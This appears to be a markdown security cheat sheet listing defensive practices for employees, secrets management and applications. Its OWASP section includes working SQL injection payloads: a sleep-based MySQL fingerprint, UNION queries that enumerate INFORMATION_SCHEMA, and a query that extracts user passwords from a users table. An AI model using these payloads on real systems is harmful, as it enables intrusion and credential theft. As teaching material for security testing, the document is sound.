# security-cheat-sheet

## Pricinples
- Security is everyone's responsibility.
- Follow principle of least priviledge.
- Enforce Role Based Access Control with logging and audit trail.
- Encrypt everything

## Data Centres

## Employees
- Enforce least privilege
- Enforce strong password policy
- Enforce 2FA
- Discourage password sharing
- Enforce password rotation
- Enforce logging and audit trail
- Enforce use of passphrase in SSH keys
- Enforce rotation of ssh keys
- Revoke access tokens and ssh keys when employee leaves company
- Enforce disk encryption
- Enforce employees to save their individual credentils using a tool like LastPass or 1Password
- Make sure employees don't publish sensitive information while releasing open source projects

## Applications
### Source code
- Make sure passwords are not checked into source code repositories. 
  Run git hook on commit to make sure sensitive data is not committed. 
  Refer - https://github.com/awslabs/git-secrets
- Dependency scanning - Ensure package vulnerability scanning and automatic upgrade
### Managing Secerts
- Manage secrets in a centralized location. e.g - Hasicorp Valut
- Enforce rotation of master key
### Applications
- Applications always granted minimum privilege
- No sharing secrets between applications, so that one one application is compromised, the blast radius is minimum
- Make applications requst secrets from the vault dynamically rather saving credentials in their database
- Make secerts that are granted to applications ephemeral. 
  For example, if a backend api requires credentials to access database -
  - It shoudld be given credentials to query the vault
  - The vault will generate an ephemeral username and password granting access to only the resources the application needs
  - The crdentials being ephemeral will be invalidated after a certain amount of time
  - If the credentials are compromised, an operator needs to invalidate all credentails granted to the application
  - In this way, other applications and resources are not compromised
- If the aapplication needs to persist sensitive information, it needs to be encrypted. The encryption key can be queried       from the vault.
#### Secret leakage
- Review code to ensure secrets aren't leaked via
  - Application logs
  - Error or diagnostic Reports
  - Build logs
#### OWASP
- Always test applications for OWASP top 10 vulnerabilities
- SQL Injection
  - Find the database

    Suppose a vulnerable website with a backend MySql database allows querying data like so
    ```bash
    $ SELECT col1, col2, col3 from <table> where <col> Like '%{user_input}%'
    ```
    We can verify its a Mysql Database by passing
    ```bash
    value' AND 1 == sleep(3);--
    ```
    If there is a delay in response due to sleep, then its a MySql database else keep trying for equivalent commands for other     database
  - Find other tables

    If we pass this value in the user field
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--
    ```
    This will result in the follwing query getting executed in backend
    ```bash
    SELECT col1, col2, col3 from <table> where <col> Like '%some_value' 
    UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--%'
    ```
  - Query a sensitive table

    One way to randomly guess is to select from a particular table and execute a sleep. If the table exists then, you will see     delay in response else you will immediately see an error.

    OR

    pass below in user input to see the columns of the sensitive table
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.columns WHERE TABLE_NAME='users');--
    ```
    Now you can query data from sensitive table
    ```bash
    some_value' UNION (SELECT user_password, address, 3 FROM users);--
    ```
    
- Javascript injection
- XSS
  - Reflective
  - persistent
- CSRF
- Broken authentication
- Privilege excalation

## Infrastructure
#### DDOS protection

  
